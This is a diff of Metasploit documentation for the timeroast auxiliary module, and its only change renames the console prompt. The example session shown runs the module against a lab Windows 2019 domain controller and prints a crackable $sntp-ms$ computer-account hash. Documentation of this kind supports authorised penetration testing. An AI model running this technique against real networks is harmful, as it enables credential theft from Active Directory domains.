@@ -26,11 +26,11 @@ The RIDs to enumerate (e.g. 1000-2000). Multiple values and ranges can be specif
 ### Windows 2019 x64 Domain Controller
 
 ```
-msf6 auxiliary(scanner/ntp/timeroast) > set RIDS 4200-4205
+msf auxiliary(scanner/ntp/timeroast) > set RIDS 4200-4205
 RIDS => 4200-4205
-msf6 auxiliary(scanner/ntp/timeroast) > set RHOSTS 192.168.159.10
+msf auxiliary(scanner/ntp/timeroast) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
-msf6 auxiliary(scanner/ntp/timeroast) > run
+msf auxiliary(scanner/ntp/timeroast) > run
 [*] Checking RID: 4200
 [*] Checking RID: 4201
 [+] Hash for RID: 4201 - 4201:$sntp-ms$74e3c4ac73afe868119ff98613888d48$1c0100e900000000000a2c704c4f434ceb0aaf8ac9813bd40000000000000000eb0aea216d99a558eb0aea216d99e010
@@ -43,5 +43,5 @@ msf6 auxiliary(scanner/ntp/timeroast) > run
 [*] Waiting on 3 pending responses...
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(scanner/ntp/timeroast) >
+msf auxiliary(scanner/ntp/timeroast) >
 ```
